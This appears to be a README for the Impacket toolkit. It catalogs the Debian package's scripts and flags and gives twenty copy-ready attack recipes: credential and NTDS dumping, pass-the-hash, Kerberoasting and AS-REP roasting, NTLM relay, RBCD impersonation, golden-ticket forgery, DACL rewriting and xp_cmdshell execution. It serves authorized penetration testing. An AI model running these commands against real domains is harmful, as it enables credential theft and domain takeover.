# Impacket — Python network protocol toolkit

- **Version:** Impacket v0.12.0 (Debian package `python3-impacket` 0.12.0-3)
- **Binaries:** five PATH wrappers — `/usr/bin/impacket-netview`,
  `/usr/bin/impacket-rpcdump`, `/usr/bin/impacket-samrdump`,
  `/usr/bin/impacket-secretsdump`, `/usr/bin/impacket-wmiexec`
- **Scripts:** 62 runnable examples under
  `/usr/share/doc/python3-impacket/examples/`
- **Help snapshots:** 29 files in this directory — `help-netview.txt`,
  `help-rpcdump.txt`, `help-samrdump.txt`, `help-secretsdump.txt`,
  `help-wmiexec.txt`, `help-getuserspns.txt`, `help-getnpusers.txt`,
  `help-psexec.txt`, `help-smbclient.txt`, `help-ntlmrelayx.txt`,
  `help-gettgt.txt`, `help-getst.txt`, `help-lookupsid.txt`,
  `help-getadusers.txt`, `help-mssqlclient.txt`, `help-addcomputer.txt`,
  `help-ticketer.txt`, `help-finddelegation.txt`, `help-rbcd.txt`,
  `help-dacledit.txt`, `help-owneredit.txt`, `help-changepasswd.txt`,
  `help-get-gpppassword.txt`, `help-getlapspassword.txt`, `help-reg.txt`,
  `help-services.txt`, `help-smbexec.txt`, `help-dcomexec.txt`,
  `help-atexec.txt`
- **Upstream:** https://github.com/fortra/impacket
- **Docs:** https://impacket.readthedocs.io/
- **Examples index:** https://github.com/fortra/impacket/tree/master/examples

> **Deep-research scenarios:** [`SCENARIOS.md`](SCENARIOS.md)

## What it does

Impacket is a collection of Python classes for working with network protocols,
plus a large set of example scripts built on those classes. The examples are
the practical part: SMB, MS-RPC, LDAP, Kerberos, TDS (MSSQL), WMI, DCOM, and
raw IP tools, each exposed as a small command-line program.

The scripts fall into four broad jobs:

1. **Enumerate** a domain or host — users, computers, SPNs, delegation, SIDs,
   sessions, RPC endpoints.
2. **Authenticate** with a password, NT hash, AES key, Kerberos ccache, or
   keytab.
3. **Execute** commands or dump secrets on a remote Windows host.
4. **Abuse** Kerberos and AD relationships — roast, relay, delegate, forge
   tickets, edit ACLs.

It is the reference implementation for much of what `netexec`, `Responder`,
`Certipy`, and BloodHound automate. Learning the individual scripts makes the
automation easier to debug and gives you a fallback when a wrapper fails.

## Use cases

| Situation | Impacket script |
|-----------|-----------------|
| Dump SAM/LSA/NTDS from a host | `secretsdump.py` |
| Kerberoast service accounts | `GetUserSPNs.py` |
| AS-REP roast accounts without pre-auth | `GetNPUsers.py` |
| Request a TGT/ST for a ccache | `getTGT.py`, `getST.py` |
| Forge golden/silver tickets | `ticketer.py` |
| Execute a command over SMB/WMI/DCOM/Task Scheduler | `psexec.py`, `wmiexec.py`, `smbexec.py`, `dcomexec.py`, `atexec.py` |
| Relay NTLM authentication | `ntlmrelayx.py` |
| Add a machine account and set RBCD | `addcomputer.py`, `rbcd.py` |
| Edit a DACL or object owner | `dacledit.py`, `owneredit.py` |
| Enumerate RPC endpoints and interfaces | `rpcdump.py`, `rpcmap.py` |
| Read GPP/LAPS secrets | `Get-GPPPassword.py`, `GetLAPSPassword.py` |
| Query MSSQL | `mssqlclient.py` |
| Stand up an SMB server | `smbserver.py`, `karmaSMB.py` |

## Install layout and invocation

Debian installs the library and the examples separately:

```text
/usr/lib/python3/dist-packages/impacket/        # library
/usr/share/doc/python3-impacket/examples/*.py   # 62 scripts
/usr/bin/impacket-{netview,rpcdump,samrdump,secretsdump,wmiexec}
```

Only five scripts get PATH wrappers. The other 57 are run through Python:

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -h
python3 /usr/share/doc/python3-impacket/examples/psexec.py -h
```

For convenience:

```bash
export IMPACKET=/usr/share/doc/python3-impacket/examples
alias GetUserSPNs="python3 $IMPACKET/GetUserSPNs.py"
```

A `pip install impacket` installs console entry points for every script, but
that is a different installation from the Debian package. Do not mix them; the
PATH wrappers and the examples can be different versions.

The examples directory is documentation and is replaced on package upgrade.
Copy a script into your engagement directory if you need to patch it.

## Universal authentication syntax

Most host-oriented scripts accept the same target and authentication flags.

| Form | Meaning |
|------|---------|
| `domain/user:password@host` | Domain credentials |
| `domain/user@host` | Prompt for the password |
| `domain/user@host -hashes :NTHASH` | Pass-the-hash |
| `domain/user@host -k -no-pass` | Kerberos from `KRB5CCNAME` |
| `domain/user@host -aesKey <hex>` | Kerberos AES key |
| `domain/user@host -keytab <file>` | Keys from a keytab (some scripts) |
| `LOCAL` | Parse local hive files instead of a host (`secretsdump`, `Get-GPPPassword`) |

| Flag | Meaning |
|------|---------|
| `-hashes LMHASH:NTHASH` | NTLM hashes; use `aad3b435b51404eeaad3b435b51404ee:NTHASH` for the empty LM hash |
| `-no-pass` | Do not prompt for a password (useful with `-k`) |
| `-k` | Kerberos; reads `KRB5CCNAME` and uses the target parameters |
| `-aesKey <hex>` | AES-128/256 key for Kerberos |
| `-keytab <file>` | Read SPN keys from a keytab |
| `-dc-ip <ip>` | Domain controller IP when DNS does not resolve it |
| `-dc-host <name>` | DC hostname for Kerberos |
| `-target-ip <ip>` | Connect to this IP while keeping the target name for SPN/auth |
| `-port <port>` | Non-default SMB/RPC port |
| `-ts` | Timestamp every log line |
| `-debug` | Verbose protocol debugging |

Domain-only scripts (`GetUserSPNs`, `GetNPUsers`, `GetADUsers`,
`GetADComputers`, `findDelegation`, `GetLAPSPassword`) take
`domain[/username[:password]]` instead of `user@host`.

## Script catalog

All 62 installed examples, grouped by job. Every script takes `-h` for its
exact flags.

### Remote execution and host control

| Script | Purpose |
|--------|---------|
| `psexec.py` | PsExec-style service execution; uploads a RemCom binary |
| `smbexec.py` | Service execution that writes a batch file; `SHARE` or `SERVER` mode |
| `dcomexec.py` | DCOM execution via `ShellWindows`, `ShellBrowserWindow`, or `MMC20` |
| `wmiexec.py` | WMI execution with a semi-interactive shell |
| `atexec.py` | Task Scheduler execution |
| `wmiquery.py` | Run WQL queries and describe WMI objects |
| `wmipersist.py` | Create/remove a WMI event filter, consumer, and binding |
| `services.py` | Start, stop, create, change, delete, and list services |
| `reg.py` | Query, add, delete, save, and back up registry keys |
| `tstool.py` | Terminal Services session and process control |

### Credential access and secret dumping

| Script | Purpose |
|--------|---------|
| `secretsdump.py` | SAM, LSA secrets, cached credentials, NTDS.DIT, DPAPI |
| `samrdump.py` | Download the user list through SAMR |
| `dpapi.py` | Decrypt DPAPI masterkeys, credentials, vaults, and blobs |
| `keylistattack.py` | KERB-KEY-LIST-REQ attack against a remote host |
| `mimikatz.py` | SMB/RPC client for a remote mimikatz server |
| `Get-GPPPassword.py` | Find and decrypt Group Policy Preferences passwords |
| `GetLAPSPassword.py` | Read LAPS passwords from LDAP |
| `getPac.py` | Retrieve a target user's PAC |
| `describeTicket.py` | Parse and decrypt a Kerberos ticket |
| `ticketConverter.py` | Convert between kirbi (KRB-CRED) and ccache |
| `ticketer.py` | Create golden, silver, and sapphire tickets |
| `goldenPac.py` | MS14-068 (golden PAC) exploit |
| `raiseChild.py` | Escalate from a child domain to the forest root |
| `DumpNTLMInfo.py` | NTLM authentication and information parsing |
| `exchanger.py` | Exchange services abuse |
| `esentutl.py` | Dump ESE database catalog, pages, and tables |
| `ntfs-read.py` | Read-only NTFS explorer for images and volumes |
| `registry-read.py` | Read registry hives offline |

### AD and Kerberos enumeration

| Script | Purpose |
|--------|---------|
| `GetADUsers.py` | Query domain users and attributes |
| `GetADComputers.py` | Query domain computers |
| `GetUserSPNs.py` | Find SPNs and request TGS tickets (Kerberoast) |
| `GetNPUsers.py` | Find accounts without pre-auth and request AS-REP |
| `findDelegation.py` | Find unconstrained, constrained, and RBCD delegation |
| `lookupsid.py` | Brute-force RIDs through LSA lookup |
| `net.py` | SAMR RPC client (`net user`, `net group`, and similar) |
| `netview.py` | Watch sessions and logged-on users across hosts |
| `addcomputer.py` | Add a machine account (SAMR or LDAPS) |
| `rbcd.py` | Read/write `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| `dacledit.py` | Read, write, backup, and restore a principal's DACL |
| `owneredit.py` | Change an object's owner |
| `changepasswd.py` | Change or reset passwords over SAMR, kpasswd, or LDAP |
| `getTGT.py` | Request a TGT and save it as a ccache |
| `getST.py` | Request a service ticket, including S4U2Self/S4U2Proxy |
| `machine_role.py` | Retrieve a host's role and primary domain |
| `rdp_check.py` | Test whether an account is valid over RDP |

### SMB, RPC, relay, and servers

| Script | Purpose |
|--------|---------|
| `smbclient.py` | Interactive SMB client (mini shell) |
| `smbserver.py` | Stand up an SMB server with a share |
| `karmaSMB.py` | Rogue SMB server that answers any requested path |
| `ntlmrelayx.py` | Relay NTLM authentication to SMB, LDAP, HTTP, MSSQL, and more |
| `rpcdump.py` | Dump RPC endpoints through the endpoint mapper |
| `rpcmap.py` | Enumerate listening MSRPC interfaces and opnums |
| `sambaPipe.py` | SambaPipe exploit (CVE-2017-7494) |

### MSSQL, MQTT, and utilities

| Script | Purpose |
|--------|---------|
| `mssqlclient.py` | TDS client with SQL and Windows authentication |
| `mssqlinstance.py` | Ask a host for its running MSSQL instances |
| `mqtt_check.py` | MQTT authentication check |
| `getArch.py` | Get the target's OS architecture |
| `ping.py` / `ping6.py` | ICMP echo with Impacket's raw sockets |
| `kintercept.py` | Intercept TCP streams |
| `sniffer.py` | Protocol sniffer (requires a protocol argument) |
| `sniff.py` / `split.py` | PCAP tools; need the `pcapy` module, which is not installed |

## Flag reference

### `secretsdump.py`

Dumps secrets remotely or parses local hives. Remote modes need local admin
(or equivalent) on the target.

| Flag | Meaning |
|------|---------|
| `target` | `[[domain/]username[:password]@]<host>` or `LOCAL` |
| `-system <hive>` / `-sam <hive>` / `-security <hive>` | Local hive inputs |
| `-ntds <file>` | Offline NTDS.DIT |
| `-bootkey <hex>` | Boot key for offline parsing |
| `-just-dc` | NTDS only (NTLM hashes and Kerberos keys) |
| `-just-dc-ntlm` | NTDS only, NTLM hashes only |
| `-just-dc-user <user>` | One user's NTDS data; implies `-just-dc` |
| `-ldapfilter <filter>` | Filter which NTDS users are extracted; implies `-just-dc` |
| `-skip-user <user>` | Skip one user or a comma-separated list/file |
| `-history` | Dump password history and LSA old values |
| `-pwd-last-set` | Show `pwdLastSet` per account |
| `-user-status` | Show whether each account is disabled |
| `-use-vss` | Use NTDSUTIL/VSS instead of DRSUAPI |
| `-exec-method {smbexec,wmiexec,mmcexec}` | Exec method for `-use-vss` |
| `-use-keylist` / `-rodcNo` / `-rodcKey` | RODC Kerb-Key-List approach |
| `-resumefile <file>` | Resume a DRSUAPI NTDS dump |
| `-outputfile <base>` | Base name for `.sam`, `.secrets`, `.cached`, `.ntds` |
| `-skip-sam` / `-skip-security` | Skip those hives on the remote host |

### `GetUserSPNs.py`

| Flag | Meaning |
|------|---------|
| `target` | `domain[/username[:password]]` |
| `-request` | Request TGS tickets in hashcat/JtR format |
| `-request-user <user>` | Request a TGS for one account |
| `-save` | Save requested TGS tickets as `<user>.ccache` |
| `-outputfile <file>` | Write hashes to a file |
| `-usersfile <file>` | Test only these users |
| `-stealth` | Drop the `(servicePrincipalName=*)` LDAP filter |
| `-no-preauth <user>` | Use a no-pre-auth account to request through AS |
| `-target-domain <domain>` | Query a different domain (cross-trust) |

### `GetNPUsers.py`

| Flag | Meaning |
|------|---------|
| `target` | `[[domain/]username[:password]]` |
| `-request` | Request TGTs for no-pre-auth accounts |
| `-format {hashcat,john}` | Output format (default `hashcat`) |
| `-outputfile <file>` | Write the AS-REP hashes |
| `-usersfile <file>` | Test only these users |

### `getTGT.py` and `getST.py`

| Script | Key flags |
|--------|-----------|
| `getTGT.py` | `identity`, `-hashes`, `-aesKey`, `-dc-ip`, `-service <SPN>`, `-principalType` |
| `getST.py` | `identity`, `-spn <SPN>`, `-impersonate <user>`, `-altservice <SPN>`, `-additional-ticket <ccache>`, `-u2u`, `-self`, `-force-forwardable`, `-renew` |

`getTGT.py` writes `<user>.ccache` in the current directory. Set
`KRB5CCNAME` to use it.

### `psexec.py`, `smbexec.py`, `dcomexec.py`, `wmiexec.py`, `atexec.py`

| Script | Distinctive flags |
|--------|-------------------|
| `psexec.py` | `-c <file>` copy a binary, `-path`, `-file`, `-service-name`, `-remote-binary-name`, `-codec` |
| `smbexec.py` | `-share` (default `C$`), `-mode {SHARE,SERVER}`, `-service-name`, `-shell-type {cmd,powershell}`, `-codec` |
| `dcomexec.py` | `-object {ShellWindows,ShellBrowserWindow,MMC20}`, `-share`, `-nooutput`, `-com-version`, `-shell-type`, `-silentcommand`, `-A <authfile>` |
| `wmiexec.py` | `-share` (default `ADMIN$`), `-nooutput`, `-silentcommand`, `-shell-type`, `-com-version`, `-codec`, `-A <authfile>` |
| `atexec.py` | `-session-id`, `-silentcommand`, `-codec` |

All five take the universal auth flags and `target [command ...]`. With no
command, the interactive scripts open a semi-interactive shell.

### `ntlmrelayx.py`

| Flag | Meaning |
|------|---------|
| `-t, --target <target>` | Relay target; `domain\user@host:port` form is accepted |
| `-tf <file>` | Target list, one per line |
| `-w` | Watch the target file for changes |
| `-i, --interactive` | Open an SMB/LDAP/SQL console after a successful relay |
| `-ip <ip>` | Interface IP to bind the SMB/HTTP servers |
| `--smb-port` / `--http-port` / `--wcf-port` / `--raw-port` | Listener ports |
| `--no-smb-server` / `--no-http-server` / `--no-wcf-server` / `--no-raw-server` | Disable a listener |
| `--no-multirelay` | Disable multi-host relay |
| `--keep-relaying` | Keep relaying after a successful connection |
| `-ra, --random` | Randomize target selection |
| `-l, --lootdir <dir>` | Loot directory |
| `-of, --output-file <file>` | Encrypted-hash output file |
| `-smb2support` | Enable SMB2 support in the server |
| `--remove-mic` | Remove the MIC (CVE-2019-1040) |
| `--remove-target` | Remove the target from the relay list after success |
| `--escalate-user <user>` | Escalate a user through LDAP relay |
| `--delegate-access` | Grant RBCD to the relayed machine account |
| `--sid` | Add a SID to the PAC |
| `--dump-laps` / `--dump-gmsa` / `--dump-adcs` | Dump those secrets after relay |
| `--add-computer [name [password]]` | Add a machine account |
| `--add-dns-record <name> <ip>` | Add a DNS record |
| `--shadow-credentials` / `--shadow-target <target>` | Shadow Credentials attack |
| `--adcs` / `--template <name>` / `--altname <name>` | ADCS relay |
| `-socks` / `-socks-address` / `-socks-port` | SOCKS proxy for relayed sessions |
| `-c, --command <cmd>` | Command to run after relay |
| `-e, --execute <file>` | Executable to run after relay |
| `--enum-local-admins` | Enumerate local administrators |
| `-q, --query <query>` | LDAP query to run after relay |
| `-m, --mailbox <mailbox>` | Exchange mailbox to target |
| `-6` | IPv6 |

### `addcomputer.py`, `rbcd.py`, `dacledit.py`, `owneredit.py`

| Script | Key flags |
|--------|-----------|
| `addcomputer.py` | `-computer-name`, `-computer-pass`, `-method {SAMR,LDAPS}`, `-no-add`, `-delete`, `-baseDN`, `-computer-group`, `-domain-netbios`, `-port {139,445,636}` |
| `rbcd.py` | `-delegate-to <account>`, `-delegate-from <account>`, `-action {read,write,remove,flush}`, `-use-ldaps` |
| `dacledit.py` | `-action {read,write,remove,backup,restore}`, `-principal <name>`, `-target <name>`, `-rights`, `-use-ldaps` |
| `owneredit.py` | `-action {read,write}`, `-new-owner <name>`, `-target <name>`, `-use-ldaps` |

`rbcd.py` writes the attacker-controlled account into the target's
`msDS-AllowedToActOnBehalfOfOtherIdentity`; the follow-up is a `getST.py`
S4U2Self/S4U2Proxy request.

### `lookupsid.py`, `rpcdump.py`, `rpcmap.py`, `samrdump.py`

| Script | Key flags |
|--------|-----------|
| `lookupsid.py` | `target [maxRid]`, `-domain-sids`, `-target-ip`, `-port` |
| `rpcdump.py` | `target`, `-target-ip`, `-port`, `-debug` |
| `rpcmap.py` | `target`, `-opnum-max`, `-version-max`, `-target-ip`, `-port` |
| `samrdump.py` | `target`, `-csv`, `-dc-ip`, `-target-ip`, `-port` |

### `smbclient.py`, `smbserver.py`, `karmaSMB.py`

| Script | Key flags |
|--------|-----------|
| `smbclient.py` | `target`, `-inputfile`, `-outputfile`, `-target-ip`, `-port` |
| `smbserver.py` | `shareName`, `sharePath`, `-smb2support`, `-username`, `-password`, `-hashes`, `-p`, `-comment`, `-readonly` |
| `karmaSMB.py` | `pathname`, `-config <file>`, `-smb2support` |

`smbserver.py` and `karmaSMB.py` bind TCP 445 by default and usually need root
or `CAP_NET_BIND_SERVICE`.

### `mssqlclient.py`, `mssqlinstance.py`, `mqtt_check.py`

| Script | Key flags |
|--------|-----------|
| `mssqlclient.py` | `target`, `-db`, `-windows-auth`, `-file`, `-show`, `-port` |
| `mssqlinstance.py` | `target`, `-port` |
| `mqtt_check.py` | `target`, `-client-id`, `-ssl`, `-port`, `-debug` |

### `Get-GPPPassword.py`, `GetLAPSPassword.py`, `changepasswd.py`

| Script | Key flags |
|--------|-----------|
| `Get-GPPPassword.py` | `target` or `LOCAL`, `-xmlfile`, `-share`, `-base-dir` |
| `GetLAPSPassword.py` | `target`, `-computer <name>`, `-outputfile` |
| `changepasswd.py` | `-newpass` / `-newhashes`, `-protocol {smb-samr,rpc-samr,kpasswd,ldap}`, `-reset`, `-altuser`/`-altpass`/`-althash` |

### `ticketer.py`, `describeTicket.py`, `ticketConverter.py`

| Script | Key flags |
|--------|-----------|
| `ticketer.py` | `target`, `-domain`, `-domain-sid`, `-spn` (silver), `-nthash`/`-aesKey`, `-groups`, `-user-id`, `-extra-sid`, `-duration`, `-impersonate` (sapphire), `-request` |
| `describeTicket.py` | `ticket`, `-u`, `-d`, `-s`, `--rc4` |
| `ticketConverter.py` | `input_file output_file` |

### `reg.py`, `services.py`, `wmiquery.py`, `wmipersist.py`, `tstool.py`

| Script | Subcommands / key flags |
|--------|--------------------------|
| `reg.py` | `query`, `add`, `delete`, `save`, `backup`; `save -o <UNC path>` |
| `services.py` | `start`, `stop`, `delete`, `status`, `config`, `list`, `create`, `change` |
| `wmiquery.py` | `target`, `-namespace`, `-file`, `-query`, `-com-version` |
| `wmipersist.py` | `-action {add,remove,list}`, `-name`, `-command`, `-trigger` |
| `tstool.py` | `target`, `-action`, `-session`, `-process`, `-user` |

## Recipes

Authorized targets only. Set `IMPACKET` to the examples directory first.

**1. Dump SAM and LSA secrets with a password.**

```bash
python3 $IMPACKET/secretsdump.py 'ACME/alice:Password123@10.10.10.5'
```

**2. Dump with an NT hash.**

```bash
python3 $IMPACKET/secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  'ACME/alice@10.10.10.5'
```

**3. Dump NTDS from a DC, one user only.**

```bash
python3 $IMPACKET/secretsdump.py -just-dc-user krbtgt \
  'ACME/Administrator:Password123@dc.acme.local'
```

**4. Parse local hives offline.**

```bash
python3 $IMPACKET/secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**5. Kerberoast.**

```bash
python3 $IMPACKET/GetUserSPNs.py 'ACME/alice:Password123' -dc-ip 10.10.10.5 \
  -request -outputfile kerberoast.txt
hashcat -a 0 -m 13100 kerberoast.txt rockyou.txt -r best64.rule
```

**6. AS-REP roast without credentials.** AS-REQ does not need a valid bind; a
user list is enough.

```bash
python3 $IMPACKET/GetNPUsers.py 'ACME/' -usersfile users.txt -no-pass \
  -dc-ip 10.10.10.5 -format hashcat -outputfile asrep.txt
hashcat -a 0 -m 18200 asrep.txt rockyou.txt
```

**7. Get a TGT, then a service ticket.**

```bash
python3 $IMPACKET/getTGT.py 'ACME/alice:Password123' -dc-ip 10.10.10.5
export KRB5CCNAME=$PWD/alice.ccache
python3 $IMPACKET/getST.py -spn 'cifs/dc.acme.local' -k -no-pass \
  'ACME/alice@dc.acme.local'
```

**8. PsExec-style execution.**

```bash
python3 $IMPACKET/psexec.py 'ACME/alice:Password123@10.10.10.5' \
  'cmd.exe /c whoami /all'
```

**9. WMI execution without a service.**

```bash
python3 $IMPACKET/wmiexec.py 'ACME/alice:Password123@10.10.10.5' \
  'powershell -c Get-Process | Select-Object -First 5'
```

**10. SMB client mini shell.**

```bash
python3 $IMPACKET/smbclient.py 'ACME/alice:Password123@10.10.10.5'
# inside: shares, use Finance, ls, get q4.pdf, exit
```

**11. Relay NTLM to LDAP and escalate.**

```bash
# Target list must contain hosts with SMB signing disabled.
python3 $IMPACKET/ntlmrelayx.py -tf targets.txt -smb2support \
  --escalate-user alice -l loot
```

Run a coercion or poisoning source separately; do not run Responder's SMB and
HTTP listeners on the same ports as `ntlmrelayx`.

**12. Add a machine account and configure RBCD.**

```bash
python3 $IMPACKET/addcomputer.py -computer-name 'EVIL$' \
  -computer-pass 'MachinePass123!' 'ACME/alice:Password123'
python3 $IMPACKET/rbcd.py -delegate-to 'CN=WEB01,CN=Computers,DC=acme,DC=local' \
  -delegate-from 'EVIL$' -action write 'ACME/alice:Password123'
python3 $IMPACKET/getST.py -spn 'cifs/web01.acme.local' -impersonate Administrator \
  'ACME/EVIL$:MachinePass123!'
```

**13. Enumerate RPC endpoints.**

```bash
python3 $IMPACKET/rpcdump.py 'ACME/alice:Password123@10.10.10.5'
```

**14. Brute-force RIDs.**

```bash
python3 $IMPACKET/lookupsid.py 'ACME/alice:Password123@10.10.10.5' 5000
```

**15. Query MSSQL with Windows auth.**

```bash
python3 $IMPACKET/mssqlclient.py -windows-auth 'ACME/alice:Password123@10.10.10.5'
# inside: SELECT @@version; EXEC xp_cmdshell 'whoami'; GO
```

**16. Read GPP passwords from SYSVOL.**

```bash
python3 $IMPACKET/Get-GPPPassword.py 'ACME/alice:Password123@dc.acme.local'
```

**17. Read LAPS passwords.**

```bash
python3 $IMPACKET/GetLAPSPassword.py 'ACME/alice:Password123' -dc-ip 10.10.10.5
```

**18. Forge a golden ticket.**

```bash
python3 $IMPACKET/ticketer.py -nthash <krbtgt_ntlm> -domain acme.local \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
```

**19. Read and write a DACL.**

```bash
python3 $IMPACKET/dacledit.py -action read -target 'CN=WEB01,CN=Computers,DC=acme,DC=local' \
  'ACME/alice:Password123'
python3 $IMPACKET/dacledit.py -action write -principal alice -rights FullControl \
  -target 'CN=WEB01,CN=Computers,DC=acme,DC=local' 'ACME/alice:Password123'
```

**20. Stand up an SMB share.**

```bash
sudo python3 $IMPACKET/smbserver.py -smb2support share /tmp/share
```

## Output and pipelines

- Most scripts print line-oriented text and log to stderr; `-ts` adds
  timestamps, `-debug` adds protocol detail.
- `secretsdump -outputfile base` writes `base.sam`, `base.secrets`,
  `base.cached`, and `base.ntds`.
- `GetUserSPNs -outputfile` and `GetNPUsers -outputfile` write hashcat/JtR
  lines that feed directly into `hashcat -m 13100` or `-m 18200`.
- `getTGT` and `getST` write `<user>.ccache`; `ticketConverter` converts
  between ccache and kirbi.
- `samrdump -csv` emits CSV; `rpcdump` emits a table of endpoints.
- `netview` runs continuously by default; `-noloop` stops after one probe.
- Exit status is not a reliable success signal across the suite; parse the
  output or check the generated file.

## Gotchas and operational security

- **Only five PATH wrappers exist on Debian.** Running `secretsdump.py` by name
  will fail; use `python3 $IMPACKET/secretsdump.py`.
- **`-hashes` wants `LMHASH:NTHASH`.** A bare NT hash may work in some scripts,
  but `:NTHASH` is the portable form.
- **Kerberos needs a ccache and a resolvable FQDN.** `-k` alone is not enough;
  set `KRB5CCNAME`, use the FQDN in the target, and add `-dc-ip` if DNS is
  split-horizon.
- **`-target-ip` keeps the name for SPN/auth.** Use it when the hostname does
  not resolve but the IP does.
- **`psexec.py` leaves artifacts.** It uploads a RemCom binary and creates a
  service. `wmiexec.py` and `atexec.py` leave different artifacts; choose
  based on the detection profile you are testing.
- **`smbexec.py -mode SERVER` needs root.** The default `SHARE` mode writes a
  batch file to `C$`.
- **`secretsdump` remote modes need admin.** DRSUAPI needs DC rights; `-use-vss`
  needs an exec method and leaves a shadow copy.
- **`-just-dc-user` implies `-just-dc`.** Do not combine it with
  `-just-dc-ntlm` expecting NTLM-only output.
- **DPAPI needs the user's masterkeys.** `dpapi.py` is not a magic decryptor;
  supply the right masterkey and blob.
- **`ntlmrelayx` needs SMB signing disabled on the target.** Check with
  `netexec smb --gen-relay-list` or `nmap --script smb2-security-mode`.
- **Do not run Responder and `ntlmrelayx` on the same ports.** Disable
  Responder's SMB/HTTP listeners or use `--no-smb-server`/`--no-http-server`.
- **LDAP relay needs LDAP signing/channel binding relaxed.** Otherwise the
  relay fails even with valid credentials.
- **`ticketer.py` needs the krbtgt hash or AES key.** A golden ticket without
  it is not possible; silver tickets need the service account key.
- **`addcomputer.py` may be blocked by `MachineAccountQuota=0`.** Check the
  quota before relying on it.
- **`dacledit.py`/`owneredit.py` change AD ACLs.** Back up the DACL first
  (`-action backup`) and restore it at close.
- **Some scripts emit Python `SyntaxWarning` lines.** They are harmless
  warnings from the installed examples; the help snapshots here suppress them.
- **`sniff.py` and `split.py` need `pcapy`, which is not installed.**
  `sniffer.py` needs a protocol argument.
- **`smbserver.py` and `karmaSMB.py` bind 445.** They need root and conflict
  with a local Samba service.
- **The examples directory is replaced on upgrade.** Keep local patches
  elsewhere.
- **Dumped secrets are highly sensitive.** Store them in the engagement
  directory, encrypt at rest, and delete at close.

## Legal and safety

Use Impacket only against systems you own or have **explicit written
authorization** to test. The suite includes credential dumping, authentication
relay, ticket forgery, ACL editing, and remote code execution. Those actions
can lock accounts, break domain trusts, and violate computer-misuse law. Stay
inside the rules of engagement, back up any AD object you modify, and never
retain dumped credentials longer than the engagement requires.

## Related tools

- [`netexec/`](../netexec/README.md) — wraps many Impacket workflows across
  whole networks.
- [`smbclient/`](../smbclient/README.md) — Samba's SMB client for comparison.
- [`rpcclient/`](../rpcclient/README.md) — Samba's MS-RPC client.
- [`ldapsearch/`](../ldapsearch/README.md) — direct LDAP queries.
- [`enum4linux-ng/`](../enum4linux-ng/README.md) — broad SMB/AD enumeration.
- [`kerbrute/`](../kerbrute/README.md) — Kerberos user enumeration and
  spraying.
- [`hashcat/`](../hashcat/README.md) — crack the hashes these scripts produce.
- [`wireshark/`](../wireshark/README.md) — inspect the protocols on the wire.

## References

- Upstream repository: https://github.com/fortra/impacket
- Examples directory: https://github.com/fortra/impacket/tree/master/examples
- Impacket documentation: https://impacket.readthedocs.io/
- Debian package: https://packages.debian.org/trixie/python3-impacket
- MS-SAMR: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/
- MS-LSAD: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/
- MS-DRSR: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/
- MS-RPCE: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/
